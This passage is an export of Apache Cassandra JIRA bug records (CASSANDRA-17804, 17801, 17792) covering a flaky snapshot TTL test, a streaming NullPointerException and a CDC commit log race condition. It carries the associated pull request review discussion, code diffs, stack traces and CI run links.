<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,paulo,maedhroz,maedhroz,05/Aug/22 20:18,07/Mar/23 10:38,13/Jul/23 08:40,31/Aug/22 11:44,4.1-beta1,5.0,,,,,Local/Snapshots,,,,0,,"See [https://app.circleci.com/pipelines/github/maedhroz/cassandra/487/workflows/0ad42210-2979-4c5d-a4e8-d8cedf9285a7/jobs/4686/tests#failed-test-0]
 
My guess is that in some resource constrained environment, even the first {{nodeool listsnapshots}} invocation doesn’t have “dropped” in the stdout. In other words, we skip to the state of the world the last assertion in the test is checking.",,adelapena,blerer,maedhroz,paulo,,,,,,,,,,,"maedhroz commented on code in PR #1789:
URL: https://github.com/apache/cassandra/pull/1789#discussion_r946078931


##########
test/distributed/org/apache/cassandra/distributed/test/AutoSnapshotTtlTest.java:
##########
@@ -149,7 +149,7 @@ public void testAutoSnapshotTTlOnDropAfterRestart() throws IOException
             instance.nodetoolResult(""listsnapshots"").asserts().success().stdoutContains(SNAPSHOT_DROP_PREFIX);
 
             // Check snapshot is removed after at most 21s

Review Comment:
   ```suggestion
               // Check snapshot is removed after at most auto_snapshot_ttl + 1s
   ```



;15/Aug/22 19:59;githubbot;600","maedhroz commented on code in PR #1789:
URL: https://github.com/apache/cassandra/pull/1789#discussion_r946080651


##########
test/distributed/org/apache/cassandra/distributed/test/AutoSnapshotTtlTest.java:
##########
@@ -126,10 +126,10 @@ public void testAutoSnapshotTTlOnDrop() throws IOException
     @Test

Review Comment:
   nit: Is the JavaDoc for this test still correct, relevant?



;15/Aug/22 20:01;githubbot;600","smiklosovic closed pull request #1789: [CASSANDRA-17804] Fix flakiness of testAutoSnapshotTTlOnDropAfterRestart
URL: https://github.com/apache/cassandra/pull/1789


;22/Oct/22 11:25;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,1800,,,0,1800,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,paulo,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Low Hanging Fruit,DTest,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Aug 31 11:42:55 UTC 2022,,,,,,,All,,,,"0|z17j6w:",9223372036854775807,,,,adelapena,maedhroz,,,Low,,4.0-alpha2,,https://github.com/apache/cassandra/commit/1ee5df02b1f98cf38f126d47a7f3fb153f790d52,,,,,,,,,test fixed,,,,,"09/Aug/22 17:23;paulo;Thanks for checking [~maedhroz], I'll take a look.;;;","15/Aug/22 00:21;paulo;This test makes the following assertions to ensure snapshots of dropped tables are properly expired after a node restart when auto_snapshot_ttl=20s:
a) that a snapshot of a dropped table exists after a node restart
b) that the snapshot is gone after expiration (20s)

This test assumes that the restart will take less than auto_snapshot_ttl=20s. If a restart takes longer than that then the snapshot is cleared as soon as the node starts and the first assertion fails.

The trivial fix is to increase auto_snapshot_ttl=60s, in the hope that a restart will never take longer than a minute and the first assertion will never fail. Unfortunately this will make the test longer but a bit more deterministic.

* PR: https://github.com/apache/cassandra/pull/1789
* CI: https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1871/;;;","15/Aug/22 20:05;maedhroz;I dropped a couple nits in the PR, but LGTM overall. I guess the difficulty here is that you can't strictly guess how long the restart will take, and therefore can't know when the first check on {{listsnapshots}} is irrelevant. The only alternative I could see is inspecting the stdout, pulling a timestamp of some kind from it, and ignoring the check on the drop prefix in the first assert if too much time had passed.;;;","17/Aug/22 21:34;paulo;Thanks for the feedback. Addressed nit comments and resubmitted CI for 4.1/trunk:

|[trunk|https://github.com/apache/cassandra/pull/1789]|[CI|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1894/]|
|[4.1|https://github.com/pauloricardomg/cassandra/tree/CASSANDRA-17804-4.1]|[CI|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1884/]|;;;","26/Aug/22 12:19;blerer;[~maedhroz] are you happy with the latest changes?;;;","29/Aug/22 16:31;maedhroz;+1;;;","30/Aug/22 16:26;adelapena;Here are some repeated runs of the fixed flaky test, still running:
||branch||vnodes||CI||
|4.1|false|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2023/workflows/942564a7-5d9f-4c12-b2f0-4ca5cc490749] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2023/workflows/978ca93d-b464-478c-a3df-6628f0f58545]|
|4.1|true|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2026/workflows/32cd730b-e299-4889-8835-770156956ac7] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2026/workflows/9702e9e6-fc1f-4981-8d83-4ce7d3ef65f2]|
|trunk|false|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2024/workflows/8e78ad06-c453-4bb4-ad32-4ebce1ddc2be] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2024/workflows/bdd5cf85-5766-4352-9a20-05b01feb0aa2]|
|trunk|true|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/2024/workflows/8e78ad06-c453-4bb4-ad32-4ebce1ddc2be] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/2025/workflows/f3ef33b3-37ee-44fb-b5c3-274dc24a338b]|

The CircleCI config file for these runs has been generated with:
{code:java}
.circleci/generate.sh -m \
  -e REPEATED_UTEST_TARGET=test-jvm-dtest-some \
  -e REPEATED_UTEST_COUNT=500 \
  -e REPEATED_UTEST_CLASS=org.apache.cassandra.distributed.test.AutoSnapshotTtlTest \
  -e REPEATED_UTEST_METHODS=testAutoSnapshotTTlOnDropAfterRestart \
  -e REPEATED_UTEST_VNODES=true
{code};;;","30/Aug/22 16:56;adelapena;It seems that all the runs above have succeeded :);;;","30/Aug/22 16:58;paulo;Thanks for the test runs [~adelapena]. Would you mind committing this? Unfortunately I'm not able to commit this before a few days.;;;","31/Aug/22 10:13;adelapena;Sure, starting commit.;;;","31/Aug/22 11:42;adelapena;Committed to 4.1 as [1ee5df02b1f98cf38f126d47a7f3fb153f790d52|https://github.com/apache/cassandra/commit/1ee5df02b1f98cf38f126d47a7f3fb153f790d52] and merged up to [trunk|https://github.com/apache/cassandra/commit/b39596b65c6bdbed5f2be35008291c69b41f1675].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NPE bug in streaming checking if SSTable is being repaired,CASSANDRA-17801,13475256,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dcapwell,dcapwell,dcapwell,05/Aug/22 00:45,29/Aug/22 14:17,13/Jul/23 08:40,08/Aug/22 20:54,5.0,,,,,,Consistency/Repair,Consistency/Streaming,,,0,,"Streaming hit a race condition where a SSTable was being repaired, but the moment we try to check the repair ID the repair was over

{code}
java.lang.NullPointerException
at org.apache.cassandra.db.streaming.CassandraStreamManager.lambda$null$0(CassandraStreamManager.java:110)
at com.google.common.collect.Iterators$5.computeNext(Iterators.java:639)
at com.google.common.collect.AbstractIterator.tryToComputeNext(AbstractIterator.java:141)
at com.google.common.collect.AbstractIterator.hasNext(AbstractIterator.java:136)
at org.apache.cassandra.db.streaming.CassandraStreamManager.lambda$createOutgoingStreams$1(CassandraStreamManager.java:121)
at org.apache.cassandra.db.ColumnFamilyStore.select(ColumnFamilyStore.java:2000)
at org.apache.cassandra.db.ColumnFamilyStore.selectAndReference(ColumnFamilyStore.java:1976)
at org.apache.cassandra.db.streaming.CassandraStreamManager.createOutgoingStreams(CassandraStreamManager.java:96)
at org.apache.cassandra.streaming.StreamSession.getOutgoingStreamsForRanges(StreamSession.java:481)
at org.apache.cassandra.streaming.StreamSession.addTransferRanges(StreamSession.java:440)
at org.apache.cassandra.streaming.StreamSession.lambda$null$6(StreamSession.java:816)
at java.base/java.lang.Iterable.forEach(Iterable.java:75)
at org.apache.cassandra.streaming.StreamSession.lambda$processStreamRequests$7(StreamSession.java:812)
at java.base/java.util.Map.forEach(Map.java:661)
at org.apache.cassandra.streaming.StreamSession.processStreamRequests(StreamSession.java:808)
at org.apache.cassandra.streaming.StreamSession.prepareAsync(StreamSession.java:740)
at org.apache.cassandra.streaming.StreamSession.lambda$prepare$3(StreamSession.java:720)
at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
at java.base/java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:304)
at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
at java.base/java.lang.Thread.run(Thread.java:834)
{code}
",,dcapwell,marcuse,,,,,,,,,,,,,"smiklosovic closed pull request #1768: CASSANDRA-17801: NPE bug in streaming checking if SSTable is being repaired
URL: https://github.com/apache/cassandra/pull/1768


;29/Aug/22 14:17;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,dcapwell,,,,,,,,,,,,,,Correctness -> Recoverable Corruption / Loss,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Aug 08 17:39:22 UTC 2022,,,,,,,All,,,,"0|z17hpk:",9223372036854775807,,,,marcuse,,,,Normal,,4.0.0,,https://github.com/apache/cassandra/commit/c7d2e97da04e09dd908b1ea238a8498cfe5a3edb,,,,,,,,,manual inspection,,,,,"05/Aug/22 06:31;marcuse;+1;;;","08/Aug/22 17:39;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|trunk|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17801-trunk-A382E7F6-F726-4D3A-9156-77999CC73FD1]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17801-trunk-A382E7F6-F726-4D3A-9156-77999CC73FD1]|[build|unknown]|
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix race condition on updating cdc size and advancing to next segment,CASSANDRA-17792,13474730,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,yifanc,e.dimitrova,e.dimitrova,02/Aug/22 15:41,06/Oct/22 15:27,13/Jul/23 08:40,16/Aug/22 22:32,4.0.6,4.1-beta1,5.0,,,,CI,,,,0,,"org.apache.cassandra.distributed.test.cdc.ToggleCDCOnRepairEnabledTest is a bit flaky on [trunk. 

As [this run|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17666] shows it was flaky since it was introduced a month ago as part of

CASSANDRA-17666 but the flakiness is so low that if we don't run it in a loop it is hard to hit it. 

Both tests in the test class can fail with the same exception:
{code:java}
org.apache.cassandra.distributed.shared.ShutdownException: Uncaught exceptions were thrown during test at org.apache.cassandra.distributed.impl.AbstractCluster.checkAndResetUncaughtExceptions(AbstractCluster.java:1056) at org.apache.cassandra.distributed.impl.AbstractCluster.close(AbstractCluster.java:1042) at org.apache.cassandra.distributed.test.cdc.ToggleCDCOnRepairEnabledTest.testCDCOnRepairEnabled(ToggleCDCOnRepairEnabledTest.java:95) at org.apache.cassandra.distributed.test.cdc.ToggleCDCOnRepairEnabledTest.testCDCOnRepairIsEnabled(ToggleCDCOnRepairEnabledTest.java:40) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) Suppressed: java.lang.NullPointerException at org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDC$CDCSizeTracker.recalculateOverflowSize(CommitLogSegmentManagerCDC.java:390) at org.apache.cassandra.concurrent.FutureTask$1.call(FutureTask.java:81) at org.apache.cassandra.concurrent.FutureTask.call(FutureTask.java:47) at org.apache.cassandra.concurrent.FutureTask.run(FutureTask.java:57) at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) at java.base/java.lang.Thread.run(Thread.java:829){code}
CC [~ycai] , [~jmckenzie] ",,e.dimitrova,jmckenzie,yifanc,,,,,,,,,,,,"josh-mckenzie commented on code in PR #1770:
URL: https://github.com/apache/cassandra/pull/1770#discussion_r939044799


##########
src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java:
##########
@@ -190,14 +189,20 @@ public CommitLogSegment.Allocation allocate(Mutation mutation, int size) throws
         return alloc;
     }
 
-    // Non-blocking mode has just recently been enabled for CDC.
-    // The segment is still marked as FORBIDDEN. It should be set to PERMITTED.
-    private void ensureSegmentPermittedIfNotBlockWrites(CommitLogSegment segment)
+    // Permit a forbidden segment under the following conditions.
+    // - Non-blocking mode has just recently been enabled for CDC.
+    // - The CDC total space has droppped below the limit (e.g. CDC consumer cleans up).
+    private void permitSegmentMaybe(CommitLogSegment segment)
     {
-        if (!DatabaseDescriptor.getCDCBlockWrites() && segment.getCDCState() == CDCState.FORBIDDEN)
+        if (segment.getCDCState() != CDCState.FORBIDDEN)
+            return;
+
+        if (!DatabaseDescriptor.getCDCBlockWrites()
+            || cdcSizeTracker.sizeInProgress.get() < DatabaseDescriptor.getCDCTotalSpace())

Review Comment:
   We _may_ want to compare to DBD.getCDCTotalSpace - the size of a CL Segment. A hypothetical example of an edge case w/this logic here:
   1. CommitLogSegment size 128mb
   2. getCDCTotalSpace = 3.95G out of 4.0G
   3. we see that getCDCTotalSpace is < max, so we flip the bit
   4. Then we overflow by `CommitLogSegment size - (4.0 - 3.95)`
   
   OR - we just leave it as is because this is likely not a big problem and maybe document it. 🤷 



##########
src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java:
##########
@@ -386,9 +388,6 @@ private void recalculateOverflowSize()
         {
             rateLimiter.acquire();
             calculateSize();

Review Comment:
   With this change we should probably go ahead and lift up the calculateSize() code body into the `submitOverflowSizeRecalculation` since it's only called in one place. Saves future maintainers the jump to trace operations.



##########
src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java:
##########
@@ -219,6 +224,8 @@ private void throwIfForbidden(Mutation mutation, CommitLogSegment segment) throw
     /**
      * On segment creation, flag whether the segment should accept CDC mutations or not based on the total currently
      * allocated unflushed CDC segments and the contents of cdc_raw
+     *
+     * Synchronized on this

Review Comment:
   This is only called in one place; recommend we forklift this code out and above to where it's called so it's clear the lock is held while these operations take place.



##########
src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java:
##########
@@ -190,14 +189,20 @@ public CommitLogSegment.Allocation allocate(Mutation mutation, int size) throws
         return alloc;
     }
 
-    // Non-blocking mode has just recently been enabled for CDC.
-    // The segment is still marked as FORBIDDEN. It should be set to PERMITTED.
-    private void ensureSegmentPermittedIfNotBlockWrites(CommitLogSegment segment)
+    // Permit a forbidden segment under the following conditions.
+    // - Non-blocking mode has just recently been enabled for CDC.
+    // - The CDC total space has droppped below the limit (e.g. CDC consumer cleans up).
+    private void permitSegmentMaybe(CommitLogSegment segment)
     {
-        if (!DatabaseDescriptor.getCDCBlockWrites() && segment.getCDCState() == CDCState.FORBIDDEN)
+        if (segment.getCDCState() != CDCState.FORBIDDEN)
+            return;
+
+        if (!DatabaseDescriptor.getCDCBlockWrites()
+            || cdcSizeTracker.sizeInProgress.get() < DatabaseDescriptor.getCDCTotalSpace())
         {
             segment.setCDCState(CDCState.PERMITTED);
         }
+

Review Comment:
   nit: extra whitespace here



##########
test/unit/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDCTest.java:
##########
@@ -91,7 +91,7 @@ public void testCDCWriteFailure() throws Throwable
                 FileUtils.deleteWithConfirm(f);
 
             // Update size tracker to reflect deleted files. Should flip flag on current allocatingFrom to allow.
-            cdcMgr.updateCDCTotalSize();
+            long x = cdcMgr.updateCDCTotalSize();

Review Comment:
   unused variable declaration



;05/Aug/22 18:02;githubbot;600","yifan-c commented on code in PR #1770:
URL: https://github.com/apache/cassandra/pull/1770#discussion_r939062038


##########
src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java:
##########
@@ -190,14 +189,20 @@ public CommitLogSegment.Allocation allocate(Mutation mutation, int size) throws
         return alloc;
     }
 
-    // Non-blocking mode has just recently been enabled for CDC.
-    // The segment is still marked as FORBIDDEN. It should be set to PERMITTED.
-    private void ensureSegmentPermittedIfNotBlockWrites(CommitLogSegment segment)
+    // Permit a forbidden segment under the following conditions.
+    // - Non-blocking mode has just recently been enabled for CDC.
+    // - The CDC total space has droppped below the limit (e.g. CDC consumer cleans up).
+    private void permitSegmentMaybe(CommitLogSegment segment)
     {
-        if (!DatabaseDescriptor.getCDCBlockWrites() && segment.getCDCState() == CDCState.FORBIDDEN)
+        if (segment.getCDCState() != CDCState.FORBIDDEN)
+            return;
+
+        if (!DatabaseDescriptor.getCDCBlockWrites()
+            || cdcSizeTracker.sizeInProgress.get() < DatabaseDescriptor.getCDCTotalSpace())

Review Comment:
   The `CDCSizeTracker` sums up the size of all commit logs, including CDC and non-CDC files, since it creates hard links for all newly created files. (A side question is.. maybe we want to created the link unless the state is `FORBIDDEN`?). So the size is often an over-estimate when the workload contains both CDC and non-CDC traffic. 
   Back to the scenario in `allocate`... if the state was previously `FORBIDDEN`, it means the total size has exceeded the limit at the time of creation. Now, the total size drops below the limit. The `CDCSizeTracker` must have run at least once. In this case, the size of the file (`allocatingFrom`) is already counted. 



;05/Aug/22 18:19;githubbot;600","yifan-c commented on code in PR #1770:
URL: https://github.com/apache/cassandra/pull/1770#discussion_r939070417


##########
src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java:
##########
@@ -219,6 +224,8 @@ private void throwIfForbidden(Mutation mutation, CommitLogSegment segment) throw
     /**
      * On segment creation, flag whether the segment should accept CDC mutations or not based on the total currently
      * allocated unflushed CDC segments and the contents of cdc_raw
+     *
+     * Synchronized on this

Review Comment:
   The method is an abstract one defined in the base class though. Alternatively, we can add `synchronized` to the method signature. Synchronize within a synchronized block should add trivial impact. 



;05/Aug/22 18:23;githubbot;600","josh-mckenzie commented on code in PR #1770:
URL: https://github.com/apache/cassandra/pull/1770#discussion_r940439942


##########
src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java:
##########
@@ -190,14 +189,20 @@ public CommitLogSegment.Allocation allocate(Mutation mutation, int size) throws
         return alloc;
     }
 
-    // Non-blocking mode has just recently been enabled for CDC.
-    // The segment is still marked as FORBIDDEN. It should be set to PERMITTED.
-    private void ensureSegmentPermittedIfNotBlockWrites(CommitLogSegment segment)
+    // Permit a forbidden segment under the following conditions.
+    // - Non-blocking mode has just recently been enabled for CDC.
+    // - The CDC total space has droppped below the limit (e.g. CDC consumer cleans up).
+    private void permitSegmentMaybe(CommitLogSegment segment)
     {
-        if (!DatabaseDescriptor.getCDCBlockWrites() && segment.getCDCState() == CDCState.FORBIDDEN)
+        if (segment.getCDCState() != CDCState.FORBIDDEN)
+            return;
+
+        if (!DatabaseDescriptor.getCDCBlockWrites()
+            || cdcSizeTracker.sizeInProgress.get() < DatabaseDescriptor.getCDCTotalSpace())

Review Comment:
   `The CDCSizeTracker must have run at least once. In this case, the size of the file (allocatingFrom) is already counted.` <- I didn't connect that. You're right.
   
   `maybe we want to created the link unless the state is FORBIDDEN?`
   🤔 We shouldn't hard link the file if the cdcState in there is FORBIDDEN should we?
   ```
   // Hard link file in cdc folder for realtime tracking
   FileUtils.createHardLink(segment.logFile, segment.getCDCFile());
   ```



;08/Aug/22 16:31;githubbot;600","josh-mckenzie commented on code in PR #1770:
URL: https://github.com/apache/cassandra/pull/1770#discussion_r940448264


##########
src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java:
##########
@@ -219,6 +224,8 @@ private void throwIfForbidden(Mutation mutation, CommitLogSegment segment) throw
     /**
      * On segment creation, flag whether the segment should accept CDC mutations or not based on the total currently
      * allocated unflushed CDC segments and the contents of cdc_raw
+     *
+     * Synchronized on this

Review Comment:
   Ah, you're right. Let's add a `@Override` then and leave it as is. 😀 



;08/Aug/22 16:41;githubbot;600","yifan-c commented on code in PR #1770:
URL: https://github.com/apache/cassandra/pull/1770#discussion_r940513909


##########
src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java:
##########
@@ -190,14 +189,20 @@ public CommitLogSegment.Allocation allocate(Mutation mutation, int size) throws
         return alloc;
     }
 
-    // Non-blocking mode has just recently been enabled for CDC.
-    // The segment is still marked as FORBIDDEN. It should be set to PERMITTED.
-    private void ensureSegmentPermittedIfNotBlockWrites(CommitLogSegment segment)
+    // Permit a forbidden segment under the following conditions.
+    // - Non-blocking mode has just recently been enabled for CDC.
+    // - The CDC total space has droppped below the limit (e.g. CDC consumer cleans up).
+    private void permitSegmentMaybe(CommitLogSegment segment)
     {
-        if (!DatabaseDescriptor.getCDCBlockWrites() && segment.getCDCState() == CDCState.FORBIDDEN)
+        if (segment.getCDCState() != CDCState.FORBIDDEN)
+            return;
+
+        if (!DatabaseDescriptor.getCDCBlockWrites()
+            || cdcSizeTracker.sizeInProgress.get() < DatabaseDescriptor.getCDCTotalSpace())

Review Comment:
   No. If the the state is FORBIDDEN, we do not create a link. The link is created only when the state is NOT FORBIDDEN (i.e. PERMITTED/CONTAINS). 
   The current implementation is that a hardlink is created for all new segments, regardless of the state. Since each FORBIDDEN segment has a change to revert back to PERMITTED, this handling is easy but at the cost of slightly over-counting (the size of one file). 
   I think, and as you mentioned, it likely not a big problem. 



;08/Aug/22 17:58;githubbot;600","josh-mckenzie commented on code in PR #1770:
URL: https://github.com/apache/cassandra/pull/1770#discussion_r940521631


##########
src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java:
##########
@@ -190,14 +189,20 @@ public CommitLogSegment.Allocation allocate(Mutation mutation, int size) throws
         return alloc;
     }
 
-    // Non-blocking mode has just recently been enabled for CDC.
-    // The segment is still marked as FORBIDDEN. It should be set to PERMITTED.
-    private void ensureSegmentPermittedIfNotBlockWrites(CommitLogSegment segment)
+    // Permit a forbidden segment under the following conditions.
+    // - Non-blocking mode has just recently been enabled for CDC.
+    // - The CDC total space has droppped below the limit (e.g. CDC consumer cleans up).
+    private void permitSegmentMaybe(CommitLogSegment segment)
     {
-        if (!DatabaseDescriptor.getCDCBlockWrites() && segment.getCDCState() == CDCState.FORBIDDEN)
+        if (segment.getCDCState() != CDCState.FORBIDDEN)
+            return;
+
+        if (!DatabaseDescriptor.getCDCBlockWrites()
+            || cdcSizeTracker.sizeInProgress.get() < DatabaseDescriptor.getCDCTotalSpace())

Review Comment:
   I'm confused. Here's what I'm seeing in the code:
   ```
       public CommitLogSegment createSegment()
       {
           CommitLogSegment segment = CommitLogSegment.createSegment(commitLog, this);
   
           // Hard link file in cdc folder for realtime tracking
           FileUtils.createHardLink(segment.logFile, segment.getCDCFile());
   
           cdcSizeTracker.processNewSegment(segment);
           return segment;
       }
   ```
   I think the code would need to read something like this to prevent hard-linking files with cdc disabled:
   ```
       public CommitLogSegment createSegment()
       {
           CommitLogSegment segment = CommitLogSegment.createSegment(commitLog, this);
   
           if (segment.getCDCState() != CDCState.FORBIDDEN)
           {
               // Hard link file in cdc folder for realtime tracking
               FileUtils.createHardLink(segment.logFile, segment.getCDCFile());
           }
   
           cdcSizeTracker.processNewSegment(segment);
           return segment;
       }
   ```
   
   Further, we'd need to add logic to hard link the file on transition from FORBIDDEN to PERMITTED if that happened later in its lifecycle.
   
   That make sense?



;08/Aug/22 18:08;githubbot;600","yifan-c commented on code in PR #1770:
URL: https://github.com/apache/cassandra/pull/1770#discussion_r940527375


##########
src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java:
##########
@@ -190,14 +189,20 @@ public CommitLogSegment.Allocation allocate(Mutation mutation, int size) throws
         return alloc;
     }
 
-    // Non-blocking mode has just recently been enabled for CDC.
-    // The segment is still marked as FORBIDDEN. It should be set to PERMITTED.
-    private void ensureSegmentPermittedIfNotBlockWrites(CommitLogSegment segment)
+    // Permit a forbidden segment under the following conditions.
+    // - Non-blocking mode has just recently been enabled for CDC.
+    // - The CDC total space has droppped below the limit (e.g. CDC consumer cleans up).
+    private void permitSegmentMaybe(CommitLogSegment segment)
     {
-        if (!DatabaseDescriptor.getCDCBlockWrites() && segment.getCDCState() == CDCState.FORBIDDEN)
+        if (segment.getCDCState() != CDCState.FORBIDDEN)
+            return;
+
+        if (!DatabaseDescriptor.getCDCBlockWrites()
+            || cdcSizeTracker.sizeInProgress.get() < DatabaseDescriptor.getCDCTotalSpace())

Review Comment:
   It makes sense. The if statement is what I proposed in the earlier comment. The ease of handling in the current implementation is what I guessed by reading the code.



;08/Aug/22 18:15;githubbot;600","yifan-c closed pull request #1770: CASSANDRA-17792: Fix race condition on updating cdc size and advancing to next segment
URL: https://github.com/apache/cassandra/pull/1770


;11/Aug/22 20:00;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,5400,,,0,5400,,,,,,,,,,,,,,,CASSANDRA-17666,,,,,,,,,,,,,,,,,,,,CASSANDRA-17790,,,,,,,,,,,,0.0,ycai,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Aug 16 22:32:16 UTC 2022,,,,,,,All,,,,"0|z17eh4:",9223372036854775807,,,,jmckenzie,,,,Normal,,4.0,,https://github.com/apache/cassandra/commit/84e10d0cad5e34ef50d6951ca33714dfde0caa53,,,,,,,,,ci,,,,,"02/Aug/22 16:29;yifanc;Thank you for filing the ticket. I will take a look. ;;;","04/Aug/22 17:33;yifanc;I got the reproduction. 
The NPE is thrown due to a race condition. In {{CommitLogSegmentManagerCDC#createSegment}}, it creates a new segment and {{processNewSegment}}, where it kicks off {{recalculateOverflowSize}} (where the NPE is thrown) in a different thread. Finally, the method returns and the {{availableSegment}} is updated to the new segment. Then, it signals the thread that waits on the {{availableSegment}} and the thread will update {{allocatingFrom}} to the {{availableSegment}}, (see {{AbstractCommitLogSegmentManager#advanceAllocatingFrom}}). As mentioned earlier, {{recalculateOverflowSize}} is started in a different thread, and it assumes that {{allocatingFrom}} is already updated. However, in the rare conditions,  {{allocatingFrom}} still has the old value, which is {{null}}, hence the NPE. ;;;","05/Aug/22 06:43;yifanc;PR: https://github.com/apache/cassandra/pull/1770
The [repeated run|https://app.circleci.com/pipelines/github/yifan-c/cassandra/371/workflows/ef687fa3-dbe5-43a2-bee4-d4d0f55d5a66] passes. ;;;","11/Aug/22 18:30;jmckenzie;+1'ed the PR; forgot to here. :);;;","11/Aug/22 18:57;yifanc;Thank you for reviewing! I updated the JIRA title to reflect the fix. ;;;","11/Aug/22 19:57;yifanc;Starting commit

CI Results:
||Branch||Source||Circle CI||
|cassandra-4.0|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17792-cassandra-4.0-B379A7D7-6E64-466B-BF81-7D8654F4110C]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17792-cassandra-4.0-B379A7D7-6E64-466B-BF81-7D8654F4110C]|
|cassandra-4.1|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17792-cassandra-4.1-B379A7D7-6E64-466B-BF81-7D8654F4110C]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17792-cassandra-4.1-B379A7D7-6E64-466B-BF81-7D8654F4110C]|
|trunk|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17792-trunk-B379A7D7-6E64-466B-BF81-7D8654F4110C]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17792-trunk-B379A7D7-6E64-466B-BF81-7D8654F4110C]|

